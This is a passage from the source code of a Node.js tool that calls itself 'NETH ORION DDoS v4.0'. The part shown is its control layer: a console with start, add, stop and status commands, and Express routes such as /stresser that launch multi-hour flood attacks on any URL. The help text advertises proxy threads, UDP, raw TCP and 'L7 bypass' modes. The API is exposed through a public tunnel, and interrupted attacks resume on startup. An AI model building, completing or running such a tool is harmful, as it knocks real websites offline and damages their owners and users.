  if (!continueAttack || !currentTarget) { console.log(colors.yellow("No active attack")); return; }
  const wallElapsed = Date.now() - currentTarget.startTime;
  const wallMin = Math.round(wallElapsed / 60000);
  const targetMin = Math.round(currentTarget.duration / 60000);
  const wallPct = currentTarget.duration > 0 ? Math.min(100, Math.round((wallElapsed / currentTarget.duration) * 100)) : 0;
  const { direct, proxy } = countThreadTypes();
  console.log(colors.cyan("\n=== ATTACK STATUS ==="));
  console.log(`${colors.yellow("Current Target:")} ${currentTarget.url}`);
  console.log(`${colors.gray(`Target duration: ${targetMin}min`)}`);
  console.log(`${colors.cyan(`Wall-clock elapsed: ${wallMin}min (${wallPct}%)`)}`);
  console.log(`${colors.green("Requests Sent:")} ${formatNumber(totalRequestsSent + totalReqCount)}`);
  console.log(`${colors.magenta(`Direct:`)} ${direct} threads | ${colors.yellow(`Proxy:`)} ${proxy} threads`);
  console.log(`${colors.magenta("Queue:")} ${targetQueue.length}/${MAX_QUEUE}`);
  console.log(colors.cyan("\n=== RESPONSE STATUS ==="));
  console.log(formatStatusDetail());
  if (targetQueue.length > 0) {
    console.log(`${colors.yellow("\nQueued Targets:")}`);
    targetQueue.forEach((t, idx) => {
      console.log(`  ${idx + 1}. ${t.url} (${Math.round(t.duration/60000)}min each)`);
    });
  }
  if (tunnelActive && nportUrl) console.log(`${colors.magenta("\nPublic URL:")} ${nportUrl}`);
  console.log("");
};

const showHelp = () => {
  console.log(colors.cyan("\n=== NETH ORION DDoS v4.0 ==="));
  console.log(`${colors.green("start <url> [hours]")}        - Start multi-threaded attack`);
  console.log(`${colors.green("add <url> [hours]")}          - Add to queue`);
  console.log(`${colors.green("stop")}                       - Stop attack`);
  console.log(`${colors.green("status")}                     - Show status`);
  console.log(`${colors.green("queue")}                      - Show queue only`);
  console.log(`${colors.green("clear")}                      - Clear console`);
  console.log(`${colors.green("help")}                       - This help`);
  console.log(`${colors.green("exit")}                       - Exit\n`);
  console.log(colors.gray(`Threads: ${numThreads} | Cycle: ${REQUESTS_PER_CYCLE}`));
  console.log(colors.gray(`UDP: ${USE_UDP} | Raw TCP: ${USE_RAW_TCP} | L7 Bypass: ${L7_BYPASS} | Keep-Alive: ${KEEP_ALIVE}`));
};

const showQueue = () => {
  if (targetQueue.length === 0) { console.log(colors.yellow("\nQueue is empty")); }
  else {
    console.log(colors.cyan("\n=== QUEUE ==="));
    targetQueue.forEach((t, idx) => {
      const r = ((t.startTime + t.duration - Date.now()) / (60 * 60 * 1000)).toFixed(2);
      console.log(`${idx + 1}. ${t.url} (${r}h left in queue)`);
    });
  }
  console.log(`\n${colors.magenta(`${targetQueue.length}/${MAX_QUEUE} slots used`)}`);
};

const clearConsole = () => {
  console.clear();
  console.log(colors.green("NETH ORION DDoS v4.0"));
  console.log(colors.gray(`Keep-Alive: ${KEEP_ALIVE} | UDP: ${USE_UDP} | RAW: ${USE_RAW_TCP} | L7: ${L7_BYPASS}`));
  console.log(colors.gray('Type "help" for commands\n'));
};

const handleCommand = async (cmd) => {
  const parts = cmd.trim().split(/\s+/);
  const command = parts[0].toLowerCase();
  const args = parts.slice(1);
  switch (command) {
    case "start":
      if (args.length < 1) { console.log(colors.red("Usage: start <url> [hours]")); return; }
      await startAttack(args[0], args[1] ? parseFloat(args[1]) : 1);
      break;
    case "add":
      if (args.length < 1) { console.log(colors.red("Usage: add <url> [hours]")); return; }
      await addToQueue(args[0], args[1] ? parseFloat(args[1]) : 1);
      break;
    case "queue": showQueue(); break;
    case "stop": await stopAttack(); break;
    case "status": showStatus(); break;
    case "clear": clearConsole(); break;
    case "help": showHelp(); break;
    case "exit": console.log(colors.yellow("Goodbye!")); process.exit(0); break;
    default:
      if (command) console.log(colors.red(`Unknown: ${command}`));
      showHelp();
  }
};

// ===================== EXPRESS ROUTES =====================

const app = express();
app.use(express.json());

app.get("/stresser", async (req, res) => {
  const url = req.query.url;
  const duration = parseFloat(req.query.duration) || 1;
  if (!url || !/^https?:\/\//.test(url)) return res.status(400).json({ error: "Invalid URL" });
  await startAttack(url, duration);
  res.json({ success: true, message: `Attack started on ${url}` });
});

app.get("/add", async (req, res) => {
  const url = req.query.url;
  const duration = parseFloat(req.query.duration) || 1;
  if (!url || !/^https?:\/\//.test(url)) return res.status(400).json({ error: "Invalid URL" });
  const success = await addToQueue(url, duration);
  res.json({ success, currentQueue: targetQueue.length });
});

app.get("/stop", async (req, res) => {
  const ip = req.ip || req.connection?.remoteAddress || 'unknown';
  if (STOP_KEY && req.query.key !== STOP_KEY) {
    console.log(colors.red(`[!] STOP attempted from ${ip} — invalid key`));
    return res.status(403).json({ error: 'Forbidden: ?key= param required (set STOP_KEY in .env)' });
  }
  console.log(colors.red(`[!] STOP requested via API from ${ip}`));
  await stopAttack();
  res.json({ success: true, totalRequests: totalRequestsSent });
});

app.get("/status", (req, res) => {
  const { direct, proxy } = countThreadTypes();
  const statusBreakdown = Object.fromEntries(statusCounts);
  res.json({
    active: continueAttack,
    currentTarget: currentTarget ? currentTarget.url : null,
    totalRequests: totalRequestsSent + totalReqCount,
    threads: activeThreads.length,
    threadsDirect: direct,
    threadsProxy: proxy,
    queueCount: targetQueue.length,
    statusCounts: statusBreakdown,
  });
});

// ===================== STARTUP =====================

const port = process.env.PORT || 25694;

(async () => {
  await autoStartTunnel();
  app.listen(port, () => {
    console.clear();
    console.log(colors.green(`\nNETH ORION DDoS v4.0`));
    console.log(colors.cyan(`Local API: http:\/\/localhost:${port}`));
    console.log(colors.magenta(`Threads: ${numThreads} | Keep-Alive: ${KEEP_ALIVE}`));
    console.log(colors.red(`UDP: ${USE_UDP} | Raw TCP: ${USE_RAW_TCP} | L7: ${L7_BYPASS}`));
    if (tunnelActive && nportUrl) console.log(colors.magenta(`Public API: ${nportUrl}`));
    console.log(colors.green('\nType "help" for commands\n'));

    resumeAttack();

    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    rl.setPrompt(colors.red("neth-orion> "));
    rl.prompt();
    rl.on("line", async (input) => {
      await handleCommand(input);
      rl.prompt();
    });
  });
})();
